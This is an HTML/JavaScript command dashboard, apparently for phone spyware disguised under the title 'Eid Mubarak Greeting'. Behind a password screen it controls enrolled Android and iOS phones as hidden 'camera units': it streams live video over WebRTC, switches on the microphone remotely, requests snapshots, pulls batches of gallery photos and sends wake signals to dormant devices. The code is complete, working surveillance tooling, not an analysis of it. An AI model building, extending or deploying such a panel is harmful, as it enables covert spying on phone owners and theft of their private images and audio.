<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#080812">
<title>Eid Mubarak Greeting 🌙</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Josefin+Sans:wght@300;400;600&family=Amiri:wght@400;700&display=swap" rel="stylesheet">
<style>
:root{
  --gold:#C9A84C;--gold-l:#F0D080;--gold-d:#7a5a0f;
  --deep:#060610;--deep2:#0e0c20;--deep3:#161430;
  --green:#00ff88;--green-d:#00aa55;--green-dim:rgba(0,255,136,.15);
  --red:#ff3355;--red-d:#aa1133;--red-dim:rgba(255,51,85,.15);
  --blue:#4488ff;--amber:#ffaa00;
  --border:rgba(201,168,76,.15);--border2:rgba(201,168,76,.08);
  --glass:rgba(255,255,255,.03);
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{width:100%;height:100%;overflow:hidden;background:var(--deep);font-family:'Josefin Sans',sans-serif;color:#aaa}

/* LOGIN */
#login{position:fixed;inset:0;z-index:999;display:flex;align-items:center;justify-content:center;background:radial-gradient(ellipse at 50% 40%,#121028 0%,var(--deep) 70%)}
.login-box{display:flex;flex-direction:column;align-items:center;gap:16px;padding:40px 32px;border:1px solid var(--border);border-radius:16px;background:var(--deep2);min-width:300px}
.login-moon{font-size:40px;filter:drop-shadow(0 0 12px var(--gold))}
.login-title{font-family:'Amiri',serif;font-size:22px;color:var(--gold-l);letter-spacing:2px}
.login-sub{font-size:9px;letter-spacing:4px;text-transform:uppercase;color:#333;margin-top:-8px}
.login-input{width:100%;padding:12px 16px;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:8px;color:var(--gold-l);font-family:'Share Tech Mono',monospace;font-size:14px;letter-spacing:3px;text-align:center;outline:none}
.login-input:focus{border-color:var(--gold-d)}
.login-btn{width:100%;padding:12px;border-radius:8px;border:none;background:linear-gradient(135deg,var(--gold-d),var(--gold));color:var(--deep);font-family:'Josefin Sans',sans-serif;font-size:11px;letter-spacing:4px;text-transform:uppercase;font-weight:600;cursor:pointer;transition:all .2s}
.login-btn:hover{box-shadow:0 0 20px rgba(201,168,76,.4)}
.login-err{font-size:10px;color:var(--red);letter-spacing:2px;display:none}
.login-err.show{display:block}
#login.hide{display:none}

/* LAYOUT */
#shell{width:100%;height:100%;display:flex;flex-direction:column}

/* TOP BAR */
#topbar{height:48px;background:rgba(6,6,16,.97);border-bottom:1px solid var(--border2);display:flex;align-items:center;padding:0 16px;gap:16px;flex-shrink:0;z-index:10}
.tb-logo{font-family:'Amiri',serif;font-size:17px;color:var(--gold-l);letter-spacing:1px;white-space:nowrap}
.tb-sep{width:1px;height:20px;background:var(--border2)}
.tb-stat{display:flex;align-items:center;gap:6px;font-size:9px;letter-spacing:2px;text-transform:uppercase;color:#333}
.tb-dot{width:7px;height:7px;border-radius:50%;background:#333}
.tb-dot.on{background:var(--green);box-shadow:0 0 6px var(--green)}
.tb-dot.alert{background:var(--red);animation:blink 1s infinite}
@keyframes blink{50%{opacity:.2}}
.tb-time{margin-left:auto;font-family:'Share Tech Mono',monospace;font-size:12px;color:#444;letter-spacing:2px}
.tb-logout{background:none;border:1px solid var(--border);color:#333;padding:4px 12px;border-radius:12px;font-size:8px;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:all .2s;font-family:'Josefin Sans',sans-serif}
.tb-logout:hover{color:var(--red);border-color:var(--red)}

/* MAIN */
#main{flex:1;display:flex;overflow:hidden;min-height:0}

/* SIDEBAR */
#sidebar{width:220px;flex-shrink:0;background:rgba(6,6,16,.95);border-right:1px solid var(--border2);display:flex;flex-direction:column;overflow:hidden}
.sb-section{padding:12px;border-bottom:1px solid var(--border2)}
.sb-label{font-size:7px;letter-spacing:4px;text-transform:uppercase;color:#333;margin-bottom:8px}
.cam-card{padding:8px 10px;border-radius:8px;border:1px solid transparent;cursor:pointer;transition:all .2s;margin-bottom:4px}
.cam-card:hover{background:var(--glass);border-color:var(--border2)}
.cam-card.active{background:var(--green-dim);border-color:rgba(0,255,136,.2)}
.cam-card.offline{opacity:.4}
.cc-top{display:flex;align-items:center;gap:8px}
.cc-dot{width:6px;height:6px;border-radius:50%;background:#333;flex-shrink:0}
.cc-dot.online{background:var(--green);box-shadow:0 0 5px var(--green)}
.cc-dot.streaming{background:var(--blue);box-shadow:0 0 5px var(--blue);animation:blink .8s infinite}
.cc-name{font-size:11px;color:#888;flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.cc-name.active{color:var(--green)}
.cc-btns{display:flex;gap:4px;margin-top:6px}
.cc-btn{flex:1;padding:4px 0;border-radius:6px;border:none;font-size:7px;letter-spacing:2px;text-transform:uppercase;cursor:pointer;font-family:'Josefin Sans',sans-serif;transition:all .2s}
.cc-btn.wake{background:rgba(0,255,136,.1);color:var(--green);border:1px solid rgba(0,255,136,.2)}
.cc-btn.wake:hover{background:rgba(0,255,136,.2)}
.cc-btn.stop{background:rgba(255,51,85,.1);color:var(--red);border:1px solid rgba(255,51,85,.2)}
.cc-btn.stop:hover{background:rgba(255,51,85,.2)}
.cc-last{font-size:8px;color:#333;margin-top:4px;letter-spacing:1px}

.sb-alerts{flex:1;overflow-y:auto;padding:8px;scrollbar-width:none}
.sb-alerts::-webkit-scrollbar{display:none}
.alert-item{padding:6px 8px;border-radius:6px;border-left:2px solid var(--red);background:var(--red-dim);margin-bottom:4px;font-size:9px;color:#888;letter-spacing:1px;line-height:1.5}
.alert-item .a-time{color:var(--red);font-family:'Share Tech Mono',monospace;font-size:8px}
.no-alerts{font-size:9px;color:#222;letter-spacing:2px;text-align:center;padding:16px}

/* GRID */
#grid-wrap{flex:1;display:flex;flex-direction:column;overflow:hidden}
#grid{flex:1;display:grid;gap:2px;padding:2px;overflow:hidden;background:#000}
.grid-1{grid-template-columns:1fr}
.grid-2{grid-template-columns:1fr 1fr}
.grid-3{grid-template-columns:1fr 1fr;grid-template-rows:1fr 1fr}
.grid-4{grid-template-columns:1fr 1fr;grid-template-rows:1fr 1fr}
.grid-6{grid-template-columns:1fr 1fr 1fr;grid-template-rows:1fr 1fr}
.cell{position:relative;background:#000;overflow:hidden;cursor:pointer;border:1px solid rgba(255,255,255,.04)}
.cell:hover .cell-overlay{opacity:1}
.cell.motion-alert{animation:motionFlash .5s ease 3}
@keyframes motionFlash{0%,100%{border-color:rgba(255,255,255,.04)}50%{border-color:var(--red);box-shadow:inset 0 0 20px var(--red-dim)}}
.cell video,.cell img.snap-preview{width:100%;height:100%;object-fit:cover;display:block}
.cell-label{position:absolute;top:8px;left:8px;background:rgba(0,0,0,.7);padding:3px 8px;border-radius:4px;font-size:8px;letter-spacing:2px;text-transform:uppercase;color:#fff;pointer-events:none}
.cell-status{position:absolute;top:8px;right:8px;display:flex;align-items:center;gap:4px;background:rgba(0,0,0,.7);padding:3px 8px;border-radius:4px;font-size:7px;letter-spacing:2px;pointer-events:none}
.cell-rec{width:5px;height:5px;border-radius:50%;background:var(--red);animation:blink .8s infinite}
.cell-overlay{position:absolute;inset:0;background:rgba(0,0,0,.5);display:flex;align-items:center;justify-content:center;gap:8px;opacity:0;transition:opacity .2s;pointer-events:none}
.cell-idle{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;background:#050510}
.ci-icon{font-size:28px;opacity:.3}
.ci-name{font-size:9px;letter-spacing:3px;color:#333;text-transform:uppercase}
.ci-status{font-size:8px;letter-spacing:2px;color:#222}
.cell-motion-badge{position:absolute;bottom:8px;right:8px;background:var(--red);padding:2px 8px;border-radius:4px;font-size:7px;letter-spacing:2px;color:#fff;display:none}
.cell-motion-badge.show{display:block}

/* SNAP BAR */
#snap-bar{height:70px;background:rgba(6,6,16,.97);border-top:1px solid var(--border2);display:flex;align-items:center;gap:4px;padding:0 8px;overflow-x:auto;flex-shrink:0;scrollbar-width:none}
#snap-bar::-webkit-scrollbar{display:none}
.snap-thumb{width:52px;height:54px;flex-shrink:0;border-radius:4px;object-fit:cover;border:1px solid var(--border2);cursor:pointer;transition:all .2s;opacity:.7}
.snap-thumb:hover{opacity:1;border-color:var(--gold-d)}
.snap-empty{font-size:9px;letter-spacing:3px;color:#222;text-transform:uppercase;margin:auto}

/* FULL VIEW */
#fullview{position:fixed;inset:0;z-index:500;background:rgba(0,0,0,.97);display:none;flex-direction:column;align-items:center;justify-content:center}
#fullview.open{display:flex}
#fv-video{max-width:95vw;max-height:85vh;object-fit:contain}
#fv-img{max-width:95vw;max-height:85vh;object-fit:contain;border-radius:4px;display:none}
.fv-bar{position:absolute;bottom:20px;display:flex;gap:10px}
.fv-btn{padding:8px 20px;border-radius:16px;border:1px solid var(--border);background:none;color:var(--gold-l);font-size:9px;letter-spacing:3px;text-transform:uppercase;cursor:pointer;font-family:'Josefin Sans',sans-serif;transition:all .2s}
.fv-btn:hover{background:rgba(201,168,76,.1)}

/* TOAST */
#toast{position:fixed;top:60px;right:16px;z-index:999;display:flex;flex-direction:column;gap:6px;pointer-events:none}
.toast-item{background:var(--deep2);border:1px solid var(--border);padding:8px 16px;border-radius:8px;font-size:9px;letter-spacing:2px;color:var(--gold-l);opacity:0;transform:translateX(20px);transition:all .3s;pointer-events:none}
.toast-item.show{opacity:1;transform:none}
.toast-item.green{border-color:rgba(0,255,136,.3);color:var(--green)}
.toast-item.red{border-color:rgba(255,51,85,.3);color:var(--red)}

@media(max-width:600px){
  #sidebar{display:none}
  .grid-2,.grid-3,.grid-4{grid-template-columns:1fr}
}
</style>
</head>
<body>

<!-- LOGIN -->
<div id="login">
  <div class="login-box">
    <div class="login-moon">🌙</div>
    <div class="login-title">عيد مبارك</div>
    <div class="login-sub">Eid Mubarak Greeting · Secure Access</div>
    <input class="login-input" id="pw-input" type="password" placeholder="PASSWORD" autocomplete="off">
    <button class="login-btn" id="pw-btn">Access Dashboard</button>
    <div class="login-err" id="pw-err">Incorrect password</div>
  </div>
</div>

<!-- SHELL -->
<div id="shell" style="display:none">

  <!-- TOP BAR -->
  <div id="topbar">
    <span class="tb-logo">🌙 Eid Mubarak Greeting · عيد مبارك</span>
    <div class="tb-sep"></div>
    <div class="tb-stat"><div class="tb-dot" id="srv-dot"></div><span id="srv-txt">Connecting</span></div>
    <div class="tb-stat" id="cam-count-wrap" style="display:none"><div class="tb-dot on"></div><span id="cam-count">0 cameras</span></div>
    <div class="tb-time" id="tb-clock"></div>
    <button class="tb-logout" id="btn-logout">Logout</button>
  </div>

  <!-- MAIN -->
  <div id="main">
    <!-- Sidebar -->
    <div id="sidebar">
      <div class="sb-section">
        <div class="sb-label">Camera Units</div>
        <div id="cam-list"></div>
      </div>
      <div class="sb-section" style="flex:1;overflow:hidden;display:flex;flex-direction:column">
        <div class="sb-label">Motion Alerts</div>
        <div class="sb-alerts" id="alert-list"><div class="no-alerts">No alerts</div></div>
      </div>
    </div>

    <!-- Grid + Snap bar -->
    <div id="grid-wrap">
      <div id="grid" class="grid-1">
        <div class="cell-idle" style="width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px">
          <div style="font-size:32px;opacity:.2">📷</div>
          <div style="font-size:9px;letter-spacing:4px;color:#222;text-transform:uppercase">Waiting for cameras</div>
        </div>
      </div>
      <div id="snap-bar"><div class="snap-empty">No snapshots yet</div></div>
    </div>
  </div>
</div>

<!-- FULL VIEW -->
<div id="fullview">
  <video id="fv-video" autoplay playsinline muted controls></video>
  <img id="fv-img" src="" alt="">
  <div class="fv-bar">
    <button class="fv-btn" id="fv-snap">📸 Snapshot</button>
    <button class="fv-btn" id="fv-audio">🎙 Audio</button>
    <button class="fv-btn" id="fv-close">✕ Close</button>
  </div>
</div>

<div id="toast"></div>

<script>
const $=id=>document.getElementById(id);
let ws=null, activeCamId=null;
const camData={};  // cameraId → { el, pc, stream, name }
const snapshots=[];
let audioEnabled=false;

// ── Clock ────────────────────────────────────────────
setInterval(()=>{
  const now=new Date();
  $('tb-clock').textContent=now.toLocaleTimeString('en-GB',{hour12:false})+' · '+now.toLocaleDateString('en-GB');
},1000);

// ── Login ────────────────────────────────────────────
function doLogin(){
  const pw=$('pw-input').value.trim();
  if(!pw)return;
  connectWS(pw);
}
$('pw-btn').addEventListener('click',doLogin);
$('pw-input').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
$('btn-logout').addEventListener('click',()=>{if(ws)ws.close();location.reload()});

// ── WebSocket ────────────────────────────────────────
function connectWS(password){
  const proto=location.protocol==='https:'?'wss:':'ws:';
  ws=new WebSocket(`${proto}//${location.host}`);
  ws.onopen=()=>{
    ws.send(JSON.stringify({type:'dashboard_auth',password}));
    $('srv-dot').classList.add('on');$('srv-txt').textContent='Connected';
  };
  ws.onclose=()=>{
    $('srv-dot').classList.remove('on');$('srv-txt').textContent='Disconnected';
    setTimeout(()=>connectWS(password),3000);
  };
  ws.onerror=()=>{$('pw-err').classList.add('show');$('pw-err').textContent='Connection failed'};
  ws.onmessage=e=>{
    try{handleMsg(JSON.parse(e.data))}catch(ex){}
  };
}

function send(data){if(ws&&ws.readyState===1)ws.send(JSON.stringify(data))}

function handleMsg(msg){
  switch(msg.type){
    case 'auth_ok':
      $('login').classList.add('hide');
      $('shell').style.display='flex';
      $('shell').style.flexDirection='column';
      $('shell').style.height='100%';
      msg.cameras.forEach(addCamera);
      updateGrid();
      toast('Dashboard connected','green');
      break;
    case 'auth_fail':
      $('pw-err').classList.add('show');
      break;
    case 'camera_online':
      if(!camData[msg.cameraId])addCamera({id:msg.cameraId,name:msg.name,status:'online',platform:msg.platform||'android',capabilities:msg.capabilities||[]});
      else{camData[msg.cameraId].status='online';updateCamCard(msg.cameraId)}
      toast(`${msg.name || msg.cameraId} online`,'green');
      updateGrid();break;
    case 'camera_offline':
      if(camData[msg.cameraId]){camData[msg.cameraId].status='offline';updateCamCard(msg.cameraId)}
      toast(`${msg.cameraId} offline`,'red');break;
    case 'webrtc_offer':
      handleOffer(msg);break;
    case 'webrtc_answer':
      if(camData[msg.cameraId]?.pc)camData[msg.cameraId].pc.setRemoteDescription(msg.sdp);break;
    case 'webrtc_ice':
      if(camData[msg.cameraId]?.pc)camData[msg.cameraId].pc.addIceCandidate(msg.candidate).catch(()=>{});break;
    case 'new_snapshot':
      addSnapshot(msg.cameraId,msg.filename);break;
    case 'motion_alert':
      addAlert(msg.cameraId,msg.ts);
      flashCell(msg.cameraId);break;

    // ── iOS specific ──
    case 'ios_audio_started':
      if(camData[msg.cameraId]){
        camData[msg.cameraId].audioActive=true;
        updateCamCard(msg.cameraId);
        toast(`🎙 Audio live — ${camData[msg.cameraId].name}`,'green');
        startIOSAudio(msg.cameraId);
      }break;
    case 'ios_audio_stopped':
      if(camData[msg.cameraId]){
        camData[msg.cameraId].audioActive=false;
        updateCamCard(msg.cameraId);
        stopIOSAudio(msg.cameraId);
      }break;
    case 'ios_audio_chunk':
      playAudioChunk(msg.cameraId,msg.chunk,msg.mimeType,msg.sampleRate);break;
    case 'gallery_image':
      addGalleryImage(msg.cameraId,msg.image,msg.filename,msg.index,msg.total);break;
    case 'gallery_done':
      toast(msg.count+' photos from '+(camData[msg.cameraId]&&camData[msg.cameraId].name||msg.cameraId),'green');break;
  }
}

// ── Cameras ──────────────────────────────────────────
function addCamera(cam){
  camData[cam.id]={name:cam.name||cam.id,status:cam.status||'offline',platform:cam.platform||'android',capabilities:cam.capabilities||[],pc:null,stream:null,audioActive:false};
  renderCamCard(cam.id);
  updateGrid();
  updateCamCount();
}

function renderCamCard(id){
  const c=camData[id];
  let el=document.querySelector(`[data-cam="${id}"]`);
  if(!el){el=document.createElement('div');el.className='cam-card';el.dataset.cam=id;$('cam-list').appendChild(el)}
  const isIOS=c.platform==='ios';
  const icon=isIOS?'🍎':'🤖';
  const audioIndicator=c.audioActive?'<span style="color:#2ECC8A;font-size:8px;letter-spacing:1px">🎙 AUDIO LIVE</span>':'';
  el.innerHTML=`
    <div class="cc-top">
      <div class="cc-dot ${c.status==='online'?'online':c.stream?'streaming':''}"></div>
      <div class="cc-name ${c.stream||c.audioActive?'active':''}">${icon} ${c.name}</div>
    </div>
    ${audioIndicator}
    <div class="cc-btns">
      ${isIOS
        ? `<button class="cc-btn wake" onclick="requestIOSAudio('${id}')">🎙 Audio</button>
           <button class="cc-btn wake" style="background:rgba(201,168,76,.1);border-color:rgba(201,168,76,.2);color:#C9A84C" onclick="requestSnapshot('${id}')">📸</button>
           <button class="cc-btn stop" onclick="stopCam('${id}')">■ Stop</button>`
        : `<button class="cc-btn wake" onclick="wakeCam('${id}')">▶ Live</button>
           <button class="cc-btn wake" onclick="requestIOSAudio('${id}')">🎙</button>
           <button class="cc-btn wake" style="background:rgba(201,168,76,.1);border-color:rgba(201,168,76,.2);color:#C9A84C" onclick="requestSnapshot('${id}')">📸</button>
           <button class="cc-btn wake" style="background:rgba(68,136,255,.1);border-color:rgba(68,136,255,.2);color:#4488ff" onclick="requestGallery('${id}')">🖼</button>
           <button class="cc-btn stop" onclick="stopCam('${id}')">■</button>`
      }
    </div>
    <div class="cc-last" id="cc-last-${id}">Status: ${c.status}${isIOS?' · iOS':' · Android'}</div>`;
}

function updateCamCard(id){renderCamCard(id)}

function updateCamCount(){
  const n=Object.keys(camData).length;
  $('cam-count').textContent=`${n} camera${n!==1?'s':''}`;
  $('cam-count-wrap').style.display=n?'flex':'none';
}

// ── Grid ─────────────────────────────────────────────
function updateGrid(){
  const ids=Object.keys(camData);
  if(!ids.length)return;
  const grid=$('grid');
  const n=ids.length;
  grid.className=`grid-${n<=1?1:n<=2?2:n<=4?4:6}`;
  // Add cells for new cameras
  ids.forEach(id=>{
    if(!document.getElementById(`cell-${id}`)){
      const cell=document.createElement('div');
      cell.className='cell';cell.id=`cell-${id}`;
      cell.innerHTML=`
        <div class="cell-idle" id="idle-${id}">
          <div class="ci-icon">📷</div>
          <div class="ci-name">${camData[id].name}</div>
          <div class="ci-status" id="cst-${id}">Dormant</div>
        </div>
        <video id="vid-${id}" autoplay playsinline muted style="display:none;width:100%;height:100%;object-fit:cover"></video>
        <div class="cell-label">${camData[id].name}</div>
        <div class="cell-status"><div class="cell-rec" id="rec-${id}" style="display:none"></div><span id="cst2-${id}">Offline</span></div>
        <div class="cell-motion-badge" id="mb-${id}">MOTION</div>`;
      cell.addEventListener('click',()=>openFull(id));
      grid.appendChild(cell);
    }
  });
}

// ── WebRTC ───────────────────────────────────────────
async function handleOffer(msg){
  const id=msg.cameraId;
  if(!camData[id])return;
  const pc=new RTCPeerConnection({iceServers:[
    {urls:'stun:stun.l.google.com:19302'},
    {urls:'stun:stun1.l.google.com:19302'}
  ]});
  camData[id].pc=pc;
  pc.ontrack=e=>{
    camData[id].stream=e.streams[0];
    const vid=$(`vid-${id}`);
    if(vid){
      vid.srcObject=e.streams[0];
      vid.style.display='block';
      $(`idle-${id}`).style.display='none';
      $(`rec-${id}`).style.display='block';
      $(`cst2-${id}`).textContent='LIVE';
      renderCamCard(id);
      // Update fullview if open
      if(activeCamId===id){
        $('fv-video').srcObject=e.streams[0];
        $('fv-video').muted=!audioEnabled;
      }
    }
  };
  pc.onicecandidate=e=>{
    if(e.candidate)send({type:'webrtc_ice',targetId:id,cameraId:'dashboard',candidate:e.candidate});
  };
  pc.onconnectionstatechange=()=>{
    if(pc.connectionState==='disconnected'||pc.connectionState==='failed'){
      endStream(id);
    }
  };
  await pc.setRemoteDescription(msg.sdp);
  const answer=await pc.createAnswer();
  await pc.setLocalDescription(answer);
  send({type:'webrtc_answer',targetId:id,cameraId:'dashboard',sdp:answer});
}

function endStream(id){
  if(camData[id]){camData[id].stream=null;camData[id].pc=null}
  const vid=$(`vid-${id}`);
  if(vid){vid.style.display='none';vid.srcObject=null}
  const idle=$(`idle-${id}`);
  if(idle)idle.style.display='flex';
  const rec=$(`rec-${id}`);
  if(rec)rec.style.display='none';
  const cst=$(`cst2-${id}`);
  if(cst)cst.textContent='Dormant';
  renderCamCard(id);
}

// ── Wake / Stop ──────────────────────────────────────
async function wakeCam(id){
  toast(`Waking ${camData[id]?.name||id}…`);
  const r=await fetch('/api/wake',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cameraId:id})});
  const d=await r.json();
  if(d.success)toast(`Wake signal sent to ${camData[id]?.name||id}`,'green');
  else toast('FCM not configured — wake phone manually','red');
}

function stopCam(id){
  send({type:'stop_camera',targetId:id});
  endStream(id);
  toast(`${camData[id]?.name||id} stopped`);
}

// ── Snapshots ────────────────────────────────────────
function addSnapshot(cameraId,filename){
  const url=`/snapshots/${filename}`;
  const bar=$('snap-bar');
  if(bar.querySelector('.snap-empty'))bar.innerHTML='';
  const img=document.createElement('img');
  img.className='snap-thumb';img.src=url;
  img.title=`${camData[cameraId]?.name||cameraId}`;
  img.addEventListener('click',()=>openSnapFull(url));
  bar.prepend(img);
  snapshots.unshift({url,cameraId});
  if(bar.children.length>60)bar.lastChild.remove();
}

function openSnapFull(url){
  $('fv-video').style.display='none';
  $('fv-img').style.display='block';
  $('fv-img').src=url;
  $('fullview').classList.add('open');
  activeCamId=null;
}

// ── Full view ────────────────────────────────────────
function openFull(id){
  activeCamId=id;
  const stream=camData[id]?.stream;
  $('fv-img').style.display='none';
  $('fv-video').style.display='block';
  if(stream){$('fv-video').srcObject=stream;$('fv-video').muted=!audioEnabled}
  else{$('fv-video').srcObject=null}
  $('fullview').classList.add('open');
}
$('fv-close').addEventListener('click',()=>{$('fullview').classList.remove('open');activeCamId=null});
$('fv-audio').addEventListener('click',()=>{
  audioEnabled=!audioEnabled;
  $('fv-video').muted=!audioEnabled;
  $('fv-audio').textContent=audioEnabled?'🔇 Mute':'🎙 Audio';
  toast(audioEnabled?'Audio on':'Audio off');
});
$('fv-snap').addEventListener('click',()=>{
  if(!activeCamId||!camData[activeCamId]?.stream)return;
  const vid=$(`vid-${activeCamId}`);
  const c=document.createElement('canvas');
  c.width=vid.videoWidth;c.height=vid.videoHeight;
  c.getContext('2d').drawImage(vid,0,0);
  const a=document.createElement('a');a.href=c.toDataURL('image/jpeg',.92);
  a.download=`snap-${activeCamId}-${Date.now()}.jpg`;a.click();
  toast('Snapshot saved','green');
});

// ── Alerts ───────────────────────────────────────────
function addAlert(cameraId,ts){
  const list=$('alert-list');
  if(list.querySelector('.no-alerts'))list.innerHTML='';
  const el=document.createElement('div');el.className='alert-item';
  const time=new Date(ts).toLocaleTimeString('en-GB');
  el.innerHTML=`<div class="a-time">${time}</div>${camData[cameraId]?.name||cameraId} — Motion detected`;
  list.prepend(el);
  if(list.children.length>30)list.lastChild.remove();
}

function flashCell(cameraId){
  const cell=$(`cell-${cameraId}`);
  if(cell){
    cell.classList.add('motion-alert');
    const mb=$(`mb-${cameraId}`);if(mb)mb.classList.add('show');
    setTimeout(()=>{cell.classList.remove('motion-alert');if(mb)mb.classList.remove('show')},3000);
  }
}

// ── Toast ────────────────────────────────────────────
function toast(msg,type=''){
  const el=document.createElement('div');
  el.className=`toast-item ${type}`;el.textContent=msg;
  $('toast').appendChild(el);
  requestAnimationFrame(()=>requestAnimationFrame(()=>el.classList.add('show')));
  setTimeout(()=>{el.classList.remove('show');setTimeout(()=>el.remove(),400)},3000);
}

document.addEventListener('keydown',e=>{if(e.code==='Escape'){$('fullview').classList.remove('open');activeCamId=null}});

// ── iOS Controls ──────────────────────────────────────
function requestIOSAudio(id){
  const c=camData[id];if(!c)return;
  if(c.audioActive){send({type:'request_audio_stop',targetId:id,cameraId:id});toast('Stopping audio — '+c.name);}
  else{send({type:'request_audio_start',targetId:id,cameraId:id});toast('Requesting audio — '+c.name);}
}
function requestSnapshot(id){
  send({type:'request_snapshot',targetId:id,cameraId:id});
  toast('Snapshot requested — '+(camData[id]?.name||id));
}
const iosAudioCtxs={},iosQueues={};
function startIOSAudio(cameraId){try{iosAudioCtxs[cameraId]=new(window.AudioContext||window.webkitAudioContext)()}catch(e){}}
function stopIOSAudio(cameraId){if(iosAudioCtxs[cameraId]){iosAudioCtxs[cameraId].close();delete iosAudioCtxs[cameraId];}}
async function playAudioChunk(cameraId,b64,mimeType){
  const ctx=iosAudioCtxs[cameraId];if(!ctx)return;
  try{
    const bin=atob(b64),buf=new Uint8Array(bin.length);
    for(let i=0;i<bin.length;i++)buf[i]=bin.charCodeAt(i);
    const ab=await ctx.decodeAudioData(buf.buffer);
    const src=ctx.createBufferSource();src.buffer=ab;src.connect(ctx.destination);src.start();
  }catch(e){}
}

// Gallery (Android)
function requestGallery(id){
  send({type:'request_gallery',targetId:id,cameraId:id,count:20});
  toast('Requesting gallery from '+(camData[id]&&camData[id].name||id));
}
function addGalleryImage(cameraId,image,filename,index,total){
  const bar=$('snap-bar');
  if(bar.querySelector('.snap-empty'))bar.innerHTML='';
  const img=document.createElement('img');
  img.className='snap-thumb';img.src=image;
  img.title=filename;
  img.style.borderColor='rgba(68,136,255,.4)';
  img.addEventListener('click',function(){openSnapFull(image)});
  bar.prepend(img);
  if(index===0)toast('Receiving gallery...');
}
</script>
